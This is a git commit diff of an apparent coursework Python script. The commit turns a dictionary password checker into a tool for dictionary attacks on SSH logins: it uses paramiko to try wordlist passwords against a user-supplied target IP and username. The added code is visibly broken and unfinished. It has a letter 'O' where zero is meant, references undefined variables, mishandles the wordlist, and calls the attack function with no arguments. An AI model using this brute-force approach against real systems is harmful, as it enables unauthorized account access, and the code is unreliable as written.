04da242380e69d4a5f99fd88cea93583b8aa66f1
forexsnyder <forexsnyder@gmail.com>
2020-10-27 15:30:12 -0700

    1

--- Challenge17.py
+++ Challenge17.py
@@ -3,16 +3,35 @@
 # Title: OpsChallenge16
 # Author:Jeff Snyder
 # Date: 26OCT2020
-# Purpose: Check or Guess passwords against a dictionary
+# Purpose: Dictionary attack against SSH connection
 ###########################
 import smtplib
 import itertools
 import sys
 import time
 import getpass
+import paramiko
+import os
+import socket
 
-def mode1():
-    filepath =input("What is the file path of the text file?   ")
+
+def bruteForceSSH(password, code =O):
+
+    ssh=paramiko.SSHClient()
+    # ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+    try:
+        ssh.connect(host,port=22, username=user, password=password)
+    except paramiko.AuthenticationException:
+        code =1
+    # except socket.error, e:
+    #     code =2
+    ssh.close()
+    return code
+
+def cracker(user, ipAddress, txtFile, ):
+    filepath =txtFile
+    for i in filepath.readlines():
+        password=i.strip("\n")
     with open(filepath) as fp:
         line = fp.readline()
         while line:
@@ -20,19 +39,19 @@ def mode1():
             line = fp.readline()
             # print(line)
             time.sleep(1)
-def mode2():
-    passwordCheck=input("Please enter the password to check.   ")
-    filepath =input("What is the file path of the text file?   ")
-    with open(filepath) as fp:
-        line = fp.readline()
-        while line:
-            line=line.strip()
-            if line == passwordCheck:
-                print("Your password of {} is a match in the dictionary".format(passwordCheck))
-                break
-            else:
-                print("{}".format(line.strip()))
-                line = fp.readline()
+# def mode2():
+#     passwordCheck=input("Please enter the password to check.   ")
+#     filepath =input("What is the file path of the text file?   ")
+#     with open(filepath) as fp:
+#         line = fp.readline()
+#         while line:
+#             line=line.strip()
+#             if line == passwordCheck:
+#                 print("Your password of {} is a match in the dictionary".format(passwordCheck))
+#                 break
+#             else:
+#                 print("{}".format(line.strip()))
+#                 line = fp.readline()
 
 # usr_password = getpass.getpass(prompt=“please enter your password”)
 
@@ -40,24 +59,11 @@ def mode2():
 
 def main():
     print("Shall we play a game?")
-    print("Please select a mode. 1 for password cracking.  2 for checking a password against a dictionary.")
-    mode=input("Press 1 or 2.   ")
-    if mode =="1":
-            print("You have selected mode 1.")
-            mode1()
-    elif mode =="2":
-            print("You have selected mode 2.")
-            mode2()
-    else:
-        print("Attention to detail.")
-        print("Attention to detail.")
-        print("Attention to detail.")
-        print("Attention to detail.")
-        print("Attention to detail.")
-        print("Attention to detail.")
-        print("Attention to detail.")
-        print("Attention to detail.")
-        main()
+    user=input("What is the username for the SSH connection?")
+    ipAddress=input("What is the ip address of the target system?")
+    txtFile=input("What is the folder path to your dictionary file?")
+    bruteForceSSH()
+    
 main()
 
 
